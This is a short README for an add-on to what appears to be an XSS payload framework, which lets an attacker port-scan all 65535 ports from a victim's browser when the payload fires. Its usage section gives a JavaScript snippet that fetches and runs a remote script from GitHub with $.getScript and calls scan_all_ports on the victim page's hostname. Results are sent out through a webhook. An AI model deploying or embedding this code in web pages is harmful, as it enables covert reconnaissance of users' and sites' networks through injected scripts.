# All port scanner
This extension allows attacker to scan all 65535 ports running HTTP(S) service on payload fire

# Usage
Uncomment from line number 180 to 182, which contains the following code:-
```javascript
$.getScript('https://raw.githubusercontent.com/shriyanss/payload-pro/main/addons/all_port_scanner/all_port_scanner.js', function (){
    scan_all_ports(document.location.hostname);
});
```

# Functioning
The function `scan_all_ports()` takes the hostname (`document.location.hostname`) as input and does bruteforcing

# Webhook
It uses same webhook for the main port scanner (that scans user specified ports)
